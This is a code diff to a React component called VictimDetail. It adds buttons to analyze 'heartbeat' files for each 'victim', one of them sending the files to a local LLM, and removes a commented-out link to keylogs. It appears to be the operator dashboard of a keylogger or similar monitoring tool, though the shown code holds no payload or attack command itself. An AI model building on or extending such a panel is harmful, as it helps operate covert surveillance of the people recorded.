@@ -1,10 +1,13 @@
 import React, { useEffect, useState } from 'react';
-import { useParams, Link } from 'react-router-dom';
+import { useParams, Link, useNavigate } from 'react-router-dom';
 import api from '../api';
+import { toast } from 'react-toastify';
 
 const VictimDetail = () => {
   const { id } = useParams();
+  const navigate = useNavigate();
   const [victim, setVictim] = useState(null);
+  const [analyzingId, setAnalyzingId] = useState(null);
 
   useEffect(() => {
     api.get(`/v1/victims/${id}`)
@@ -31,6 +34,38 @@ const VictimDetail = () => {
       });
   };
 
+  const handleAnalyze = (heartbeatId) => {
+    setAnalyzingId(heartbeatId);
+
+    api.get(`/v1/heartbeat/analyze/${heartbeatId}`)
+      .then((res) => {
+        navigate(`/heartbeat/analyse/${heartbeatId}`);
+      })
+      .catch(err => {
+        console.error('Error analyzing file:', err);
+        toast.error(err.response?.data?.message || err.message || 'Error analyzing file');
+      })
+      .finally(() => {
+        setAnalyzingId(null);
+      });
+  };
+
+  const handlePredictLocalLLM = (heartbeatId) => {
+    setAnalyzingId(heartbeatId + '_ollama');
+
+    api.get(`/v1/heartbeat/analyze_ollama/${heartbeatId}`)
+      .then((res) => {
+        navigate(`/heartbeat/analyse/${heartbeatId}?type=ollama`);
+      })
+      .catch(err => {
+        console.error('Error predicting with local llm:', err);
+        toast.error(err.response?.data?.message || err.message || 'Error predicting with local llm. Please retry as the endpoint call does return sometimes bad gateway.');
+      })
+      .finally(() => {
+        setAnalyzingId(null);
+      });
+  };
+
   if (!victim) return <p>Loading...</p>;
 
   return (
@@ -54,10 +89,25 @@ const VictimDetail = () => {
               <td>{new Date(h.timestamp).toLocaleString()}</td>
               <td>
                 <button
+                  className="btn btn-sm btn-primary me-2"
                   onClick={() => handleDownload(h.id)}
-                  className="btn btn-sm btn-primary"
+                  disabled={h.emptyFile}
                 >
                   Download
+                </button>
+                <button
+                  className="btn btn-sm btn-warning me-2"
+                  onClick={() => handleAnalyze(h.id)}
+                  disabled={analyzingId === h.id || h.emptyFile}
+                >
+                  {analyzingId === h.id ? 'Loading...' : 'Analyze'}
+                </button>
+                <button
+                  className="btn btn-sm btn-info"
+                  onClick={() => handlePredictLocalLLM(h.id)}
+                  disabled={analyzingId === h.id + '_ollama' || h.emptyFile}
+                >
+                  {analyzingId === h.id + '_ollama' ? 'Loading...' : 'Predict with Local LLM'}
                 </button>
               </td>
             </tr>
@@ -65,9 +115,6 @@ const VictimDetail = () => {
         </tbody>
       </table>
 
-      {/* <Link to={`/victim/${id}/keylogs`} className="btn btn-outline-secondary mt-3">
-        View All Keylogs
-      </Link> */}
     </div>
   );
 };
